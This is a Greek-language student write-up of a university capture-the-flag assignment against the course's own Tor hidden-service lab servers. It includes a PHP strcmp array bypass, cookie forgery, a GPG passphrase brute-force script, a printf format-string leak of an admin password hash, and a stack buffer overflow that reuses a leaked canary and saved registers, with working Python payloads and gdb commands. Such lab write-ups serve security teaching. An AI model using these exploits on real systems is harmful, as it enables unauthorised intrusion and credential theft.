# Όνομα ομάδας: hackerz - Εργασία 2
**Μέλη**:
 - Κώστας Χατζόπουλος - 1115201300202
 - Βασίλειος Πουλόπουλος - 1115201600141


## Ερώτημα 1 
Για να απαντήσουμε την ερώτηση "**Που βρισκεται ο Γιώργος;**" ακολουθήσαμε την παρακάτω διαδικασία:

Αρχικά, πλοηγηθήκαμε στο site ( http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion ) , στον κώδικα html και στα cookies. Τα 2 πράγματα που μας κίνησαν το ενδιαφέρον ήταν το σχόλιο στον κώδικα αλλά και το οτι μέσω του cookie μπορούσαμε να αλλάξουμε τον αριθμό των visitors.
### Για το σχόλιο
Μπήκαμε στο άρθρο που είχε το σχόλιο (https://blog.0day.rocks/securing-a-web-hidden-service-89d935ba1c1d) και δοκιμάζαμε ότι έλεγε μήπως βρίσκαμε κάτι που δεν είχε γίνει. Πράγματι, το path **/server-info** (http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/server-info) δεν ήταν κλειδωμένο και μπήκαμε να δούμε αν θα βρούμε πληροφορίες που μας ενδιαφέρουν. 

Βρήκαμε **(1)** πως υπάρχει και **προσωπικό site του ys13** το οποίο βρισκόταν σε άλλο link (http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/) και οδηγεί σε μία φόρμα εισόδου που ζητάει κωδικό και **(2)** πως επιτρέπεται η είσοδος σε αρχεία με κατάληξη **.phps**. 

### Για το cookie
Παρατηρήσαμε πως το cookie ήταν ένα string της μορφής **base64(number:sha256(number))** οπότε βάζοντας στο number οτιδήποτε, μπορούσε να τυπωθεί στη σελίδα κάτω από το visitor number. Έτσι, φτιάξαμε ένα script (cookie.py) στο οποίο δίναμε την είσοδο που θέλαμε και υπολόγιζε το αντίστοιχο cookie.

**cookie.py:**
```python
from hashlib import sha256
from base64 import b64encode

print("Give input")
x = input()
y = sha256(x.encode())
y = y.hexdigest()
final = x+":"+y
encoded = b64encode(final.encode('ascii'))
print(encoded.decode('ascii'))
```

### Personal YS13 website
Μέσω του html κώδικα της φόρμας εισόδου, είδαμε ότι έκανε GET request στο path **/access.php**. 
Αφού επιτρέπεται η είσοδος στα **.phps** αρχεία, δοκιμάσαμε να μπούμε στο **/access.phps** (http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/access.phps) και τα καταφέραμε.
Έτσι, είχαμε πλέον πρόσβαση στον κώδικα του αρχείου **access.php** που φαίνεται παρακάτω και για να συνεχίσουμε έπρεπε να υπολογίσουμε το περιεχόμενο της μεταβλητής **$desired** καθώς και έναν τρόπο να διαπεράσουμε τον έλεγχο της **strcmp** για το password.

**access.php:**
```php
<?php
// get $secret, $desired and $passwd from this file
// i set $desired to the 48th multiple of 7 that contains a 7 in its decimal representation
require_once "secret.php";

if ((((((((((((((((((intval($_GET['user']) !== $desired) || (strlen($_GET['user'])) != 7))))))))))))))))) {
    die("bad user...\n");
}
if ( isset ($_GET[ 'password' ])) {
   if (strcmp($_GET[ 'password' ], $passwd) != 0 ){
     die("bad pass...\n");
   }
}else {
   die("no pass...\n");
}

// authenticated under YS13's dynamic authentication. greet the user!
echo $secret
?>
```


Tο περιεχόμενο της μεταβλητής **$desired** το υπολογίσαμε μέσω script που φτιάξαμε (desired.py)

**desired.py:**
```python
number = 7
p = 1
mult = 0
counter = 0
while  1:
    mult = p*number
    if (str(mult)).count('7') != 0: 
	    counter += 1    
	    print(str(counter) + ": " + str(mult))    
    if counter == 48:    
	    print(mult)    
	    break    
    p += 1
```

και μας έβγαλε τον αριθμό **1337**, αλλά έπρεπε το μέγεθος του **$desired** να είναι 7, οπότε βάλαμε για username τον αριθμό **0001337**, ο οποίος ήταν και ο σωστός. 

Για το password ψάξαμε αν μπορούμε να διαπεράσουμε την **strcmp** της php. Ψάχνοντας στο google, βρήκαμε αυτό το [άρθρο](https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016). Στείλαμε το password σαν **array** και η strcmp μας γύρισε **NULL** αντί για error. Στην php ισχύει ότι **NULL == 0**, οπότε διαπεράσαμε τη συνθήκη της if. (http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/access.php?user=0001337&password[]=%22%22) και άνοιξε μια νέα λευκή σελίδα όπου είχε το εξής μήνυμα:
> Hi! You can find my blog posts at directory: /blogposts7589109238!

Μπήκαμε στα **blog posts** (http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/blogposts7589109238 ) και κάναμε access τον φάκελο που περιέχει τα post (http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/blogposts7589109238/blogposts/). 

Εκτός από τα posts (**diary.html**, **diary2.html**) βρήκαμε και το **post3.html** όπου περιέχει το παρακάτω περιεχόμενο:

> case notes (unfinished)
> 
> A weirdo (Giorgos Komninos) brought me this iphone today. He was
> definitely in a paranoid state saying that "raccoon" is the secret
> over and over...
> 
> theory: the phone is loaded with more than 20 different
> "anti-tracking" applications. that's probably why it's not working
> 
> i'll try a factory reset and see how that works.
> 
> i left the phone backup in the standard secret backup location in
> fixers that only the winner visitor #100013 will find...

Διαβάζοντάς το, κρατήσαμε δύο πράγματα που φανταζόμασταν ότι θα μας ήταν χρήσιμα:
1) Τη λέξη "**raccoon**" 
2) Την τελευταία πρόταση που έλεγε πως  τα backup θα τα βρεί ο **#100013 χρήστης** που θα μπει στο site. 

Έχοντας τη δυνατότητα στην αρχική σελίδα να αλλάξουμε το visitor number μέσω του cookie, το αλλάξαμε σε 100013 και έτσι, εμφανίστηκε το παρακάτω μήνυμα:

>  Visitor number
> Congrats user #100013! Check directory /sekritbackups2444 for latest
> news... 

Έτσι, ανοίγοντας το λινκ http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/sekritbackups2444/, βρήκαμε τα παρακάτω backup files: 

1) firefox.log.gz.gpg
2) notes.txt.truncated
3) passphrase.key.truncated	 
4) signal.log.gpg 

Διαβάσαμε το περιεχόμενο του αρχείου **notes.txt.truncated** όπως φαίνεται παρακάτω και είδαμε πως κάνει το encrypt για τα αρχεία του. 

**notes.txt.truncated:**
> entry #79:
> 
> so i recently found this software called gpg which is capable of
> encrypting my files, and i came up with a very smart and
> easy-to-remember way to finally keep my data secret:
> 
> First of all, I generate a random passphrase using the SHA256 hash
> algorithm, and then I save it on disk in hex as "passphrase.key". In
> particular, here is how to generate the key:
> 
>     key = SHA256(<current date in RFC3339 format> + " " + <secret string>)
> 
>     e.g. so if the secret string is "cement" then the key would be:
>              key = SHA256("2020-05-18 cement") = cadf84c9706ff4866f8af17d3c0e3503da44aea21c2580bd6452f7a1b8b48ed2
> 
> Then I use the gpg software to encrypt my files using the
> passphrase.key file:
> 
>     $ gpg --symmetric --passphrase-file passphrase.key --batch plaintext.txt
> 
> I then delete all the unencrypted files and the key files and just
> leave the encrypted files behind.
> 
> This way, if you don't know the date and the secret string there is no
> reason to even try... Seriously this secret string is super secret and
> I would never say it to anyone....
> 
> XXX don't forget to delete this file, the key and the script before
> crossing borders
> 
> XXX i've noticed that sometimes my file deletion script has issues and
> leaves
>     corrupted truncated files beh

Υποθέσαμε πως το "**raccoon**" είναι το string που θέλαμε αντί για το "**cement**" αλλά δεν ξέραμε την ημερομηνία. Έτσι φτιάξαμε ένα script (decrypt.py) το οποίο δοκίμαζε όλες τις ημερομηνίες του 2020 με τη λέξη "raccoon" και τέλος βρήκαμε τη σωστή ημερομηνία η οποία ήταν η "**2020-2-12**". 

**decrypt.py:**
```python
import hashlib
import os

def encrypt_string(hash_string):
sha_signature = \
    hashlib.sha256(hash_string.encode()).hexdigest()
return sha_signature

for y in range(1, 12):
for i in range(1, 31):
    x = "2020-" + "{:02d}".format(y) + "-" + "{:02d}".format(i) + " raccoon"
    print(x)
    sha_signature = encrypt_string(x)
    cmd1 = 'echo ' + sha_signature + ' | gpg --batch --yes --passphrase-fd 0 /home/msi/Desktop/sekritbackups2444/firefox.log.gz.gpg'
    cmd2 = 'echo ' + sha_signature + ' | gpg --batch --yes --passphrase-fd 0 /home/msi/Desktop/sekritbackups2444/signal.log.gpg'
    print(cmd1)
    os.system(cmd1)
    os.system(cmd2)
```

Έχοντας τη σωστή ημερομηνία, κάναμε **decrypt** με επιτυχία τα αρχεία:
1) firefox.log.gz.gpg. 
2) signal.log.gpg

Παρατηρήσαμε ότι το αρχείο firefox.log είχε εκατομμύρια γραμμές όπου εμφανιζόταν η πρόταση "**https://en.wikipedia.org/wiki/The_Conversation**"  και αποφασίσαμε να κάνουμε drop κάθε γραμμή που εμπεριείχε αυτή την πρόταση για να δούμε αν θα μείνει κάποια γραμμή διαφορετική τρέχοντας το bash script (remove.sh)

**remove.sh:**
```bash
grep -v "https://en.wikipedia.org/wiki/The_Conversation" firefox.log > out.txt
```

 για να φύγουν όλα τα link του wikipedia και πράγματι υπήρχε μια διαφορετική γραμμή η οποία είχε link σε κάποιο repository του Github (https://github.com/asn-d6/tor/).  

Εξερευνόντας προσεκτικά τα commit στο repository, παρατηρήσαμε το τελευταίο commit που είχε κάνει ο κύριος George Kadianakis. Το link ήταν το: [https://github.com/asn-d6/tor/commit/9892cc3b12db4dc1e8cbffec8e18bb18cbd77d0f](https://github.com/asn-d6/tor/commit/9892cc3b12db4dc1e8cbffec8e18bb18cbd77d0f). 

Έπειτα, ανοίξαμε το αρχείο **signal.log** και είδαμε τα παρακάτω περιεχόμενα: 

```text
22 Feb 15:18 - You:    Hey Maria :)
23 Mar 20:44 - You:    Maria? I need a favor.
24 Mar 13:32 - You:    Maria, I passed from your place the other day but you were not there. Please call me it's urgent.
24 Mar 13:34 - Maria:  ???
25 Mar 13:35 - You:    HEy Maria! I'm trying to make sense of the inbetweens. I think I'm part of some weird game other people are playing on me...
25 Mar 13:35 - You:    my flat got poisoned by those people and im now sleeping in the balcony.
25 Mar 13:35 - You:    the neighbors are looking at me when i sleep.
25 Mar 13:36 - You:    i saw a girl in the eleveator yesterday holding a plant with big branches. she started talking to me. i didnt naswer. i think.
25 Mar 13:36 - You:    my mobile phone is broken. its tracking me and sending details to those men. i need to send it for repair.
25 Mar 13:37 - You:    i think im not well. need to escape this city. they are looking at me. i dont git why...
25 Mar 13:37 - You:    please come and find me. you are the only person i can commit to: 2355437c5f30fd2390a314b7d52fb3d24583ef97
25 Mar 13:38 - You:    hope to see you soon! thanks!>
25 Mar 17:12 - Maria:  ??? What are you talking about? I'm not Maria. I think you got the wrong number mate.
```

Παρατηρήσαμε πως το 11ο μύνημα, υπάρχει ο κωδικός hash **2355437c5f30fd2390a314b7d52fb3d24583ef97** και η λέξη **commit**. Έτσι σκεφτήκαμε να αντικαταστήσουμε τον κωδικό του τελευταίου commit στο παραπάνω url με αυτόν που πήραμε από το αρχείο signal.log ([https://github.com/asn-d6/tor/commit/2355437c5f30fd2390a314b7d52fb3d24583ef97](https://github.com/asn-d6/tor/commit/2355437c5f30fd2390a314b7d52fb3d24583ef97)). 

Όταν ανοίξαμε το commit είδαμε τις εξής αλλαγές:
```diff
- /** Set the default values for a service configuration object <b>c</b>. */
+ /** Hey maria... I need you to come and find me. I'm hiding in a place produced
+  *  by my polymorphic geolocation algorithm.
+ *
+  *  You can find my coordinates by doing the following trick:
+  *  1) Calculate hexdigest = SHA256(<team name>). So for example the hexdigest of
+  *     SHA256("YS13Hey") is:
+  *         aea0f148fcabc595acb43d0945e6a36f538eceda8794bcb04d2dc16274ed9c68.
+  *
+  *  2) From that digest, derive two strings: x = hexdigest[16:] and y = hexdigest[16:32]
+  *
+  *  3) Convert those two hexadecimal strings into a decimal number by first
+  *     prepending "0."  and converting to a decimal fraction. Examples:
+  *           "0.aea0f148fcabc595" -> 0.682143287963...
+  *           "0.acb43d0945e6a36f" -> 0.674625220073...
+  *
+  *  4) Use the first half as the latitude and the second half as the longitude,
+  *     and use 47 and 4 as the integer part of the decimals respectively. So in
+  *     this case the above example becomes: (47.682143287963, 4.674625220073632)
+  *
+  * See you there!
+  *
+  * PS: I don't know what <team name> means but I hope you do....
+  */
+
```
Έτσι φτάσαμε στις οδηγίες για την εύρεση των συντεταγμένων όπου για **< team name>** βάλαμε το όνομα της ομάδας μας "**hackerz**". Ετσι βρήκαμε τις συντεταγμένες.   

Συντεταγμένες: **(47.5284864714, 4.8260977302)**


## Ερώρημα 2
Για να απαντήσουμε την ερώτηση "**Τι λείπει για να ολοκληρώθει το "Plan X";**" ακολουθήσαμε την παρακάτω διαδικασία: 

Ανοίγοντας το diary2.html (http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/blogposts7589109238/blogposts/diary2.html), είδαμε μια γαλάζια σελίδα με το παρακάτω περιεχόμενο:

```
Blog entry #2

I know you all want to learn about my hobbies and interests!

Due to the sensitive nature of my affiliation with the "Plan X" group I'm not just writing this stuff out here for all the creeps to see it.

Fortunately, a valued customer with a cool black hat recently gave me a secure interface for storing sensitive information. He said that it's even open source and ultra secure: https://github.com/chatziko/pico

I set it up on 4tpgiulwmoz4sphv.onion! Check it out but please come by the store (when we open) and ask me for the password first.
```
και αυτό που μας έκανε εντύπωση ήταν:
1) Το link του github με τον κώδικα του pico server (https://github.com/chatziko/pico) και 
2) το link για τον server [4tpgiulwmoz4sphv.onion](4tpgiulwmoz4sphv.onion).

Στήσαμε τον pico server στα μηχανήματά μας ώστε να τον τεστάρουμε και να δούμε τον κώδικα αναλυτικά. 

Αρχικά είδαμε το παρακάτω "**TODO**" σχόλιο (main.c:25): 

```c
// TODO: gcc 7 gives warnings, check
```
το οποίο ενημερώνει πως κατά τη μεταγλώτιση θα υπάρχουν warnings και πράγματι ο **gcc** δίνει το παρακάτω warning:

```bash
main.c: In function ‘check_auth’:
main.c:135:5: warning: format not a string literal and no format arguments [-Wformat-security]
     printf(auth_username);
     ^
```
Έτσι, παρατηρήσαμε πως κάτι δεν πάει καλά με την εντολή printf (main.c:135) και ότι είναι vulnerable σε επιθέσεις διότι δεν παίρνει ριτά το output format, αφήνοντας έτσι το χρήστη να βάλει το δικό του format με ότι αυτό συνεπάγεται.

Εκμεταλλευόμενοι αυτήν την ευπαθεια, τυπώσαμε addresses βάζοντας για input μερικά **%08x** και πράγματι μας τα τύπωνε. Στη συνέχεια βάλαμε **%s** στο τέλος των **%08x** οπότε αν υπήρχε κάποιο string εκεί θα τυπωνόταν.

Έτσι, αρχίσαμε από την πρώτη διεύθυνση να προσπαθούμε να τυπώσουμε κάποιο string, αν δε βρίσκαμε κάτι, προσθέταμε ένα **%08x** πριν το **%s** ωστε να πάμε στην επόμενη διεύθυνση να τυπώσουμε το string. Αυτό το συνεχίσαμε μέχρι να βρούμε κάτι χρήσιμο. 

Φτιάξαμε ένα script που μας έφτιαχνε το input με όσα **%08x** θέλαμε (input.py).

**input.py:**
```python
import os

from base64 import b64encode    
x =  '%08x '    
baseInput =  "%08x "     

for i in  range(0, 5):    
    baseInput = baseInput + x    
baseInput +=  "%s:lalala"    
encoded = b64encode(baseInput.encode('ascii'))
print(baseInput)    
curl =  "curl -I 'http://127.0.0.1:8000/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Authorization: Basic "  + encoded.decode('ascii') +"'"    
print(curl)    
os.system(curl)    
print('\n\n')
```    

Μετά από μερικές προσπάθειες βρήκαμε τα στοιχεία του πρώτου χρήστη (ήταν της μορφής **name:md5(password)**) που βρίσκονταν στο αρχείο **passwd**. 

Μεταφέραμε ακριβώς το ίδιο input (**%08x %08x %08x %08x %08x %08x %s**) στο server της άσκησης και το output ήταν το παρακάτω: 

> http://4tpgiulwmoz4sphv.onion is requesting your username and
> password. The site says: “Invalid user:  5807d010 15 5656951d ffffffff
> d00 5806d155 admin:f68762a532c15a8954be87b3d3fc3c31”


Άρα το **md5 hash** του κωδικου του χρήστη **admin** είναι: **f68762a532c15a8954be87b3d3fc3c31**

Έπειτα, ψάξαμε σε μερικά site το md5 hash για να το κάνουμε **decrypt** και μετά από μερικές προσπάθειες βρήκαμε το site [https://md5.gromweb.com/?md5=f68762a532c15a8954be87b3d3fc3c31](https://md5.gromweb.com/?md5=f68762a532c15a8954be87b3d3fc3c31) το οποίο μας έδωσε το password "**you shall not pass**" :D

Τέλος, αποκτήσαμε πρόσβαση στο site http://4tpgiulwmoz4sphv.onion και είδαμε μια λευκή σελίδα με το παρακάτω περιεχόμενο:
```
Welcome to the YS13 oasis! <3

Over the past 5 years we've been evolving YS13 to fit a greater range of research activities
while also being in contact with fellow enterpreneurs who help us monetize and bring our goals
reality.

We have a long list of projects to get where we want, but our next priority is "Plan X":
that is, building an indoors greenhouse so that we can finally cultivate onions and avocados when we
send our initial colony on Saturn.

We are missing a "solar wind analyzer" to be able to proceed with this plan.
If you see this page and you have one, please bring it to the YS13 store and we will count you in as a project backer.

Love you big time!

```
Οπότε καταλήξαμε στο συμπέρασμα ότι η απάντηση βρισκόταν εκεί και συγκεκριμένα στην πρόταση "**We are missing a "solar wind analyzer" to be able to proceed with this plan.**". 

Για να ολοκληρωθεί το Plan X χρείάζεται ένας **ηλιακός  αναλυτής ανέμου**...

## Ερώρημα 3
Για να απαντήσουμε την ερώτηση "**Ποια ειναι τα results του "Plan Y";**" ακολουθήσαμε την παρακάτω διαδικασία:

Παρατηρήσαμε ότι το input που δίναμε το έπαιρνε  η συνάρτηση **memcpy** για να το αντιγράψει στον πίνακα **post_data** και για μήκος χρησιμοποιούσε τo μήκος του input + 1 (payload_size + 1). Οπότε αν δίναμε είσοδο πάνω από 100 χαρακτήρες η memcpy θα έκανε πάνω από 100 αντιγραφές με αποτέλεσμα να μπορούμε να κάνουμε buffer overflow.

Στη συνέχεια τρέξαμε τον server με gdb για δούμε την δομή της στοίβας στο frame της συνάρτησης **post_param**.

Είδαμε ότι μετά τα 100 στοιχεία του buffer ήταν το **canary**, **δυο ίδιες διευθύνσεις σταθερές**, o **saved $ebp** και o **saved $eip**. 

Σκοπός μας ήταν να αλλάξουμε τη διεύθυνση του **saved $eip**, να κάνουμε την συνάρτηση **post_param** να επιστρέψει μεσα στο if(allowed) και να κληθεί η συνάρτηση **serve_ultimate()**. Εν τέλη αποφασίσαμε να κάνουμε την συνάρτηση **post_param** να επιστρέψει μέσα στην συνάρτηση **serve_ultimate**.

Για αρχή αλλάξαμε την τιμή του **saved $eip** από τον **gdb**, της δώσαμε την τιμή της διεύθυνσης εντολής **<serve_ultimate+18>** και πράγματι ο κώδικας συνέχισε να εκτελείται από εκείνη την εντολή και μετά, δηλαδή μέσα στην συνάρτηση **serve_ultimate** με αποτέλεσμα να δούμε τα περιεχόμενα του αρχείου **ultimate.html**

Για να γίνει το attack έπρεπε να κάνουμε ένα buffer overflow στο οποίο όλα τα στοιχεία μετά τον buffer θα παραμείνουν ίδια εκτός από τον **saved $eip**. Για αυτό το λόγο έπρεπε να ξέρουμε την τιμή του **canary**, του  **saved $ebp** και τις **2 ενδιάμεσες διευθύνσεις** (που ήταν ίσες) που είχαμε παρατηρήσει ότι παραμένανε σταθερές. 

Χρησιμοποιήσαμε την vulnerable printf του ερωτήματος 2 και τυπώσαμε το frame της **check_auth** όπως αυτό εμφανίζεται στη στοίβα. 

Το **saved $ebp** είναι το ίδιο γιατί γυρνάνε στην ίδια συνάρτηση (route) και το Canary ειναι επίσης το ίδιο για όλες τις συναρτήσεις του προγράμματος. 

Παρατηρήσαμε επίσεις πως η μια από τις 2 ενδιάμεσες διευθύνσεις ήταν ίδια με τις 2 ενδιάμεσες διευθύνσεις του frame του post_param.

Στη συνέχεια τυπώσαμε το frame της check_auth + την επόμενη διεύθυνση (saved $eip) από τον remote server, οπότε είχαμε το canary, την αντίστοιχη διεύθυνση της σταθερής διεύθυνσης που θέλαμε, τον saved $ebp και τον saved $eip, βρήκαμε και τον αντίστοιχο local saved $eip και τον αφαιρέσαμε από τον saved $eip του remote server, έτσι είχαμε το offset ανάμεσα στον local server και στον remote server. Προσθέσαμε αυτό το offset στην διεύθυνση της εντολής **<serve_ultimate+18>** και βρήκαμε την διεύθυνσή της στο remote server. Τέλος σχεδιάσαμε το input, το οποίο ήταν της μορφής:

> 'Α' * 100 + Canary + Constant address * 2 + Saved $ebp + <serve_ultimate+18> address

Με αυτό το input, καταφέραμε να κάνουμε το exploit.

Για να κάνουμε τις δοκιμές στον remote server, τρέξαμε την εντολή socat:
```bash
socat TCP4-LISTEN:8000,bind=127.0.0.1,fork SOCKS4A:localhost:4tpgiulwmoz4sphv.onion:80,socksport=9150
```

εχοντας ανοικτό το tor service και στην συνέχεια εκτελέσαμε το script request.py για να κάνουμε το request.

**request.py:**
```python
import requests

headers = {
'U': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Content-Type': 'application/x-www-form-urlencoded',
'Origin': 'http://127.0.0.1:8000',
'Authorization': 'Basic YWRtaW46eW91IHNoYWxsIG5vdCBwYXNz',
'Connection': 'keep-alive',
'Referer': 'http://127.0.0.1:8000/',
'Upgrade-Insecure-Requests': '1',
}

#canary = i.to_bytes(4, byteorder='little')
data = b'A' * 100               # <-- buffer
data += b'\x00\xe2\x4c\xe7'     # <-- canary
data += b'\x00\x70\x5c\x56'     # <-- canary
data += b'\x00\x70\x5c\x56'     # <-- canary
data += b'\x78\x58\x8e\xff'     # <-- saved $ebp
data += b'\x6d\x49\x5c\x56'     # <-- saved $eip
try:
response = requests.post('http://127.0.0.1:8000/ultimate.html', headers=headers, data=data)
status_code = response.status_code
print("status_code = [" + str(status_code) + "]")
print("text = [" + response.text+ "]")
except requests.exceptions.RequestException as e:
print(e)
```
Response:

 > Results:
> 
> 41.99334111122333
> 
> Preliminary results, the answer is approximate. Our supercomputer is
> working on it but it's taking forever.
> 
> The log is here: /var/log/z.log



**debug.sh:**
```bash
#!/bin/sh
make

PID=ps -eaf | grep picoserver | grep -v grep | awk '{print $2}'

kill -9 $PID

gdb\
-ex 'b httpd.c:58'\
-ex 'b main.c:179'\
-ex 'b main.c:181'\
-ex 'b main.c:194'\
-ex 'b main.c:197'\
-ex 'r'\
-ex 'set follow-fork-mode child'\
-ex 'c'\
-ex 'x/39xw $sp'\
-ex 'x/a $ebp + 4'\
./picoserver
```

**Χρήσιμες εντολές gdb:**
Υπολογισμός του offset της διεύθυνσης του remote server σε σχέση με την διεύθυνση του local server:

    call fprintf(stderr, "%p\n", [remote address] - [local address])

Υπολογισμός του διεύθυνσης εντολής:

    call fprintf(stderr, "%p\n", [local address of command] + offset)

Επαλήθευση σωστής διεύθυνσης εντολής

    x/a 0x0040190a

Επανασύνδεση του gdb με την γονική διεργασία:

    attach [PID]
 
Υπολογισμός λέξεων που καταλαμβάνει το τρέχον frame:

    p ($ebp - $esp) / 4 // <-- 40
Εκτύπωση του τρέχον frame σε λέξεις:

    x/40xw $sp

Σημείωση: Τα python scripts είναι γραμμένα σε **python3**.
